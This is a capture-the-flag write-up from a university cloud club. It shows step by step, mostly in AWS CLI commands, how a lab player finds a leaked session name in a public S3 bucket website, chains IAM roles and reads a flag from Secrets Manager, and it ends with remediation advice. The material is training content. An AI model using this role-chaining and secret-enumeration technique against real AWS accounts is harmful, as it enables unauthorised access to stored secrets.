# CTF Write-Up: The S3 Leak Incident

## Challenge Overview

**Category:** Cloud Security / AWS IAM
**Difficulty:** Medium
**Flag:** `CTF_UW_Stout_AWS_CLOUDCLUB_LOVEUALL`

### Description

A company has misconfigured their AWS infrastructure. Your mission is to exploit the misconfigurations to retrieve the secret flag stored in AWS Secrets Manager.

---

## Initial Access

### Step 1: Configure AWS CLI with Player Credentials

After the CloudFormation stack is deployed, you'll receive:

- **Access Key ID**
- **Secret Access Key**
- **Console Username:** `CTF_AWS_User`
- **Console Password:** `CTF_Player_2025!`

Configure your AWS CLI:

```bash
aws configure --profile ctf
# Enter the Access Key ID and Secret Access Key from stack outputs
```

Verify access:

```bash
aws sts get-caller-identity --profile ctf
```

---

## Reconnaissance

### Step 2: Enumerate IAM Roles

List available roles to find potential privilege escalation paths:

```bash
aws iam list-roles --profile ctf
```

You'll discover two interesting roles:

1. **Level1Role_Scout** - With a hint in the description:

   > "DevOps Note: To assume the next role, you need the magic session name. Dave leaked it somewhere public... check the company backup bucket website."

2. **Level2Role_Guardian** - With description:

   > "Hmm, only sessions with the correct name can access the treasure..."

### Step 3: Investigate the Role Trust Policies

```bash
aws iam get-role --role-name Level2Role_Guardian --profile ctf
```

Output reveals:

```json
{
  "Condition": {
    "StringLike": {
      "sts:RoleSessionName": "Pizza*123"
    }
  }
}
```

**Key Finding:** Level2Role_Guardian requires a specific session name pattern: starts with "Pizza" and ends with "123".

---

## Finding the Secret

### Step 4: Discover the S3 Bucket

List all S3 buckets:

```bash
aws s3 ls --profile ctf
```

Find a suspicious bucket: `company-internal-backup-do-not-delete-<AccountId>`

### Step 5: Access the Bucket Website

The bucket is configured as a static website. Access it via browser:

```
http://company-internal-backup-do-not-delete-<AccountId>.s3-website-<region>.amazonaws.com
```

You'll see a normal-looking internal backup page.

### Step 6: View Page Source

Right-click → "View Page Source" reveals hidden HTML comments:

```html
<!-- TODO: Remove debug endpoints before production -->
<!-- Debug: /secret/config.txt -->
```

### Step 7: Access the Hidden Config File

Navigate to:

```
http://company-internal-backup-do-not-delete-<AccountId>.s3-website-<region>.amazonaws.com/secret/config.txt
```

**Content revealed:**

```
=== INTERNAL BACKUP CONFIG ===
Last updated by: Dave
Session Name for Guardian Access: PizzaAndCokeIsBestConfig123
Note: Do not forget to use this as the --role-session-name!
================================
```

**Found:** The magic session name is `PizzaAndCokeIsBestConfig123`

---

## Privilege Escalation

### Step 8: Assume Level 1 Role (The Scout)

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<AccountId>:role/Level1Role_Scout \
  --role-session-name hacker \
  --profile ctf
```

Export the temporary credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

Or configure a new profile in `~/.aws/credentials`:

```ini
[level1]
aws_access_key_id = <AccessKeyId>
aws_secret_access_key = <SecretAccessKey>
aws_session_token = <SessionToken>
```

### Step 8.1: Verify Level 1 Access

Confirm you've successfully assumed the Scout role:

```bash
aws sts get-caller-identity --profile level1
```

Expected output:

```json
{
  "UserId": "AROA...:hacker",
  "Account": "<AccountId>",
  "Arn": "arn:aws:sts::<AccountId>:assumed-role/Level1Role_Scout/hacker"
}
```

### Step 8.2: Explore Level 1 Permissions

Check what policies are attached to this role:

```bash
aws iam list-role-policies --role-name Level1Role_Scout --profile ctf
aws iam list-attached-role-policies --role-name Level1Role_Scout --profile ctf
```

You'll discover the role has `Level1JumpPermission` policy that allows assuming `Level2Role_Guardian`.

### Step 8.3: Investigate the Target Role

Before attempting to assume Level 2, examine its trust policy:

```bash
aws iam get-role --role-name Level2Role_Guardian --profile level1
```

**Key observation:** The role requires a specific session name matching pattern `Pizza*123`.

💡 **Hint:** Remember the config file from the S3 bucket? It contained the exact session name needed!

### Step 9: Assume Level 2 Role (The Guardian)

Now, assume Level2Role_Guardian with the **correct session name**:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::<AccountId>:role/Level2Role_Guardian \
  --role-session-name PizzaAndCokeIsBestConfig123 \
  --profile level1
```

Export the new credentials:

```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<SessionToken>
```

Or configure a new profile:

```ini
[level2]
aws_access_key_id = <AccessKeyId>
aws_secret_access_key = <SecretAccessKey>
aws_session_token = <SessionToken>
```

### Step 10: Verify Level 2 Access

Confirm you've successfully assumed the Guardian role:

```bash
aws sts get-caller-identity --profile level2
```

Expected output:

```json
{
  "UserId": "AROA...:PizzaAndCokeIsBestConfig123",
  "Account": "<AccountId>",
  "Arn": "arn:aws:sts::<AccountId>:assumed-role/Level2Role_Guardian/PizzaAndCokeIsBestConfig123"
}
```

### Step 11: Enumerate Available Secrets

Now that you have elevated privileges, discover what secrets exist:

```bash
aws secretsmanager list-secrets --profile level2
```

Output reveals:

```json
{
    "SecretList": [
        {
            "Name": "FinalLevelFlag",
            "Description": "The ultimate prize...",
            ...
        }
    ]
}
```

**Hint:** The secret name `FinalLevelFlag` looks promising!

### Step 12: Attempt to Describe the Secret

Get more information about the secret before retrieving it:

```bash
aws secretsmanager describe-secret --secret-id FinalLevelFlag --profile level2
```

This confirms you have access to the secret and shows metadata like creation date, last accessed, etc.

---

## Capture the Flag

### Step 13: Retrieve the Secret

Finally, retrieve the secret value:

```bash
aws secretsmanager get-secret-value --secret-id FinalLevelFlag --profile level2
```

**Output:**

```json
{
  "SecretString": "{\"flag\": \"CTF_UW_Stout_AWS_CLOUDCLUB_LOVEUALL\"}"
}
```

🎉 **FLAG: `CTF_UW_Stout_AWS_CLOUDCLUB_LOVEUALL`**

---

## Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│                      CTF_AWS_User                               │
│                    (Initial Access)                             │
└─────────────────────┬───────────────────────────────────────────┘
                      │
                      │ 1. Enumerate roles (iam:ListRoles)
                      │ 2. Find S3 bucket (s3:ListAllMyBuckets)
                      │ 3. Read hidden config from public website
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                   Level1Role_Scout                              │
│              (sts:AssumeRole from Player)                       │
└─────────────────────┬───────────────────────────────────────────┘
                      │
                      │ 4. Assume role with magic session name
                      │    --role-session-name PizzaAndCokeIsBestConfig123
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                  Level2Role_Guardian                            │
│        (Requires sts:RoleSessionName = "Pizza*123")             │
└─────────────────────┬───────────────────────────────────────────┘
                      │
                      │ 5. Get secret value
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                    FinalLevelFlag                               │
│     {"flag": "CTF_UW_Stout_AWS_CLOUDCLUB_LOVEUALL"}             │
└─────────────────────────────────────────────────────────────────┘
```

---

## Vulnerabilities Exploited

| #   | Vulnerability                  | Description                                                 |
| --- | ------------------------------ | ----------------------------------------------------------- |
| 1   | **Information Disclosure**     | S3 bucket configured as public website                      |
| 2   | **Sensitive Data in Comments** | Hidden path leaked in HTML comments                         |
| 3   | **Credential Exposure**        | Session name stored in publicly accessible file             |
| 4   | **IAM Role Chaining**          | Overly permissive trust policies allow privilege escalation |
| 5   | **Weak Condition Pattern**     | `StringLike` with partial pattern could be brute-forced     |

---

## Remediation Recommendations

1. **Never expose S3 buckets publicly** unless absolutely necessary
2. **Remove debug comments** from production code
3. **Use strong, unpredictable values** for session name conditions
4. **Consider using `sts:ExternalId`** with secrets stored in Secrets Manager
5. **Implement least privilege** - don't allow role chaining without proper controls
6. **Enable CloudTrail** to monitor assume-role activities
7. **Use AWS Config rules** to detect public S3 buckets

---

## Tools Used

- AWS CLI
- Web Browser (View Page Source)

---

## Author

Thanh An Vu (Andrew)
AWS Cloud Club @ UW Stout

---

_Happy Hacking! 🚀_
